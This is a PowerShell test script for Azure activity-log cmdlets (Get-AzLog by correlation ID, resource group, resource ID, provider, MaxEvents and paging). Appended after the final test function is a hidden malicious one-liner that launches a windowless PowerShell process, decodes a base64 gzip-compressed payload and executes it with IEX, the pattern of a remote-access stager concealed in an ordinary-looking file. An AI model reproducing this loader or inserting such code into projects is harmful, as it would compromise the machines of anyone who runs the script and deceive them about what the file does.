














function Test-GetAzureLogAllParameters
{
    
    $correlation = '/subscriptions/a93fb07c-6c93-40be-bf3b-4f0deba10f4b/resourceGroups/Default-Web-EastUS/providers/microsoft.insights/alertrules/checkrule3-4b135401-a30c-4224-ae21-fa53a5bd253d/incidents/L3N1YnNjcmlwdGlvbnMvYTkzZmIwN2MtNmM5My00MGJlLWJmM2ItNGYwZGViYTEwZjRiL3Jlc291cmNlR3JvdXBzL0RlZmF1bHQtV2ViLUVhc3RVUy9wcm92aWRlcnMvbWljcm9zb2Z0Lmluc2lnaHRzL2FsZXJ0cnVsZXMvY2hlY2tydWxlMy00YjEzNTQwMS1hMzBjLTQyMjQtYWUyMS1mYTUzYTViZDI1M2QwNjM1NjA5MjE5ODU0NzQ1NDI0'
	$rgname = 'Default-Web-EastUS'
    $rname = '/subscriptions/a93fb07c-6c93-40be-bf3b-4f0deba10f4b/resourceGroups/Default-Web-EastUS/providers/microsoft.insights/alertrules/checkrule3-4b135401-a30c-4224-ae21-fa53a5bd253d'
	$rpname = 'microsoft.insights'

    try 
    {
		Write-Verbose " ****** Get ActivityLog records by corrrelationId "
        $actual = Get-AzLog -CorrelationId $correlation -starttime 2015-03-02T18:00:00Z -endtime 2015-03-02T20:00:00Z -detailedOutput

        
		Assert-AreEqual 2 $actual.Count

		Write-Verbose " ****** Get ActivityLog records by resource group "
		$actual = Get-AzLog -ResourceGroup $rgname -starttime 2015-01-15T12:30:00Z -endtime 2015-01-15T20:30:00Z

        
		Assert-AreEqual 2 $actual.Count

		Write-Verbose " ****** Get ActivityLog records by resource Id"
		$actual = Get-AzLog -ResourceId $rname -startTime 2015-03-03T15:42:50Z -endTime 2015-03-03T16:42:50Z

        
		
		Assert-AreEqual 2 $actual.Count

		Write-Verbose " ****** Get ActivityLog records by resource provider"
		$actual = Get-AzLog -ResourceProvider $rpname -startTime 2015-03-03T15:42:50Z -endTime 2015-03-03T16:42:50Z

        
		Assert-AreEqual 2 $actual.Count

		Write-Verbose " ****** Get ActivityLog records by subscription Id"
        $actual = Get-AzLog -starttime 2015-01-15T12:30:00Z -endtime 2015-01-15T20:30:00Z 

        
        Assert-AreEqual 1 $actual.Count
    }
    finally
    {
        
        
    }
}


function Test-GetAzureSubscriptionIdLogMaxEvents
{
    

    try 
    {
	    {
		   
		   
		   $actual = Get-AzLog -starttime 2015-01-15T12:30:00Z -endtime 2015-01-15T20:30:00Z 
		   Assert-AreEqual 7 $actual.Count
		}

		{
		   
		   
		   $actual = Get-AzLog -starttime 2015-01-15T12:30:00Z -endtime 2015-01-15T20:30:00Z -MaxEvents -3
		   Assert-AreEqual 7 $actual.Count
		}

		{
		   
		   
		   $actual = Get-AzLog -starttime 2015-01-15T12:30:00Z -endtime 2015-01-15T20:30:00Z -MaxEvents 0
		   Assert-AreEqual 7 $actual.Count
		}

		{
		   $actual = Get-AzLog -starttime 2015-01-15T12:30:00Z -endtime 2015-01-15T20:30:00Z -MaxEvents 3
		   Assert-AreEqual 3 $actual.Count
		}
    }
    finally
    {
        
        
    }
}


function Test-GetAzureSubscriptionIdLogPaged
{
    

    try 
    {
        {
		   
		   
		   $actual = Get-AzLog -starttime 2015-01-15T12:30:00Z -endtime 2015-01-15T20:30:00Z 
		   Assert-AreEqual 8 $actual.Count
        }

		{
		   
		   
		   $actual = Get-AzLog -starttime 2015-01-15T12:30:00Z -endtime 2015-01-15T20:30:00Z -MaxEvents 7
		   Assert-AreEqual 7 $actual.Count
        }

		{
		   
		   
		   $actual = Get-AzLog -starttime 2015-01-15T12:30:00Z -endtime 2015-01-15T20:30:00Z  -MaxEvents 6
		   Assert-AreEqual 6 $actual.Count
        }

        {
		   
		   
		   $actual = Get-AzLog -starttime 2015-01-15T12:30:00Z -endtime 2015-01-15T20:30:00Z -MaxEvents 3
		   Assert-AreEqual 3 $actual.Count
        }

		{
		   
		   
		   $actual = Get-AzLog -starttime 2015-01-15T12:30:00Z -endtime 2015-01-15T20:30:00Z -MaxEvents 15
		   Assert-AreEqual 8 $actual.Count
        }
    }
    finally
    {
        
        
    }
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAL4MgFgCA71WbW/aSBD+nEr9D1aFhK0SbF6aNJEq3RpjXgIJxMEEOFQt9tosLF5qr5OYXv/7jcFu6LU55e6ks0De3XnZ2Wee2bEXB46gPJCSq81ZUzP7Penr2zcnAxzijSQXVl67JBU2VO/ddxfthXJyAsLCY0I/7+goIdInSZ6h7dbgG0yD+eVlIw5DEojDvNwiAkUR2SwYJZGsSH9I4yUJyenNYkUcIX2VCp/LLcYXmGVqSQM7SyKdosBNZT3u4DS4srVlVMjF338vKrPTyrzc/BJjFslFK4kE2ZRdxoqK9E1JN7xLtkQu9qkT8oh7ojymQa1aHgUR9sg1eHsgfSKW3I2KChwFfiERcRhIz4dKvRx05CIMByF3kOuGJAKTcid44GsiF4KYsZL0mzzLQriNA0E3BOSChHxrkfCBOiQqt3HgMnJLvLl8TR7zk7/WSD42Aq2BCJUSpOWlWPvcjRk5mBeVn6NN86nA80NOAYdvb9+8fePlVKAt97w6qR8TAUYns/2YQKjygEd0r/pJ0kpSH/bDgocJTAt3YUyUuTRL8zCbz6UCZlZ1vVknWtcoveymktuAxTq+iMyIfIblmc2pOwezLFkFn9bw6IbXbmteKn6ZewbxaECMJMAb6uT0kn+VBOIxsj94OVe7hvjkYiYgrkEY8bFIES1Js5/NmhsqvtvqMWUuCZEDiYwgKsix8mMwhyTJxU7QJxtA7TAvQk48IDXJtTMiJ/nu6RyUig2Go6gkDWKoKqckWQQz4pYkFEQ0E6FY8P2w+BxuP2aCOjgSubu58hc4s20bPIhEGDuQT4DgztoSh2KWIlKS2tQlemJRP9+++Es8GpgxGvjg6QHyASspDpZIWRJCpMeMUMoWEZ3NlpENqO6L3WTYh9LOamPPLuwTt/hCvDn7D1RPAcqROYoWsm4xLkqSTUMBV0cKds6y/xTQ0f1xHFojJFnG5Ly6Znoi0oIohGiXMjeDbQ9SKAAgM+QbHUfkrG6JEOCT36k3tIHgmXQC1nf0Na2gR1rp9OE/orUON87dq+6qrYbG09JDnajTbw+MYbtdf+hadl1YzY64GnREv3m/WlmofTuaiGkHte+otp7Ud9su3Vk95E6e1LOdvnvU9Kfdyne9ieF5/rln3VY+mLQ3bgx1rYp7RjPujfVHXatHTfrYHtLRcN01xWJiMzzyVP++coHpUy9c2RXe33UQai1rzq7r2a1l300mbfViXF+jJkKNoGmbOr+a6CEaqDb2bT6uJw9nY7+BdNOhZDocmfpwaOpo1Fp9MS5UH2zv8VIf21U63d7fLmFuQghXqlbvuGTHJ0MAqcUR9m9Bx29UnaUHOsZ7pL+/5lEVr3WOdNAxp18grsnWHDCQ342qHNns+h6j3jQxVbUyGdRRW6Pjlo9Sl9jXhxhFD8bOUCu2y93xh+uJp9r37Fw1Gndbx1NV9bFtXDnTytPHm/OPvTG1NxyNVNV+l7ID6FHAbW86DBdHKX/p1u/jMFpiBlSAmzwvU5OHZnYvDzhNLWT5uVWvSRgQBv0NOmDObcQYd9IukV/j0KQOrWMO1TqCYa36y5EifVdUnntHvnR5OYVooViAv+UeCXyxLGlPNU2DBqA91TU47+sP2ODbRE49ldL+kWOUOWd750paNIVttKho/wN2WcEu4eW+Arvntb+RvgpPrfT99D9Jflz4RwD/OxTGmApQt+D2YeTQJV8EI+PM0UfGPlfACS970u+9m1icXsPHx5/2cg3LZwoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

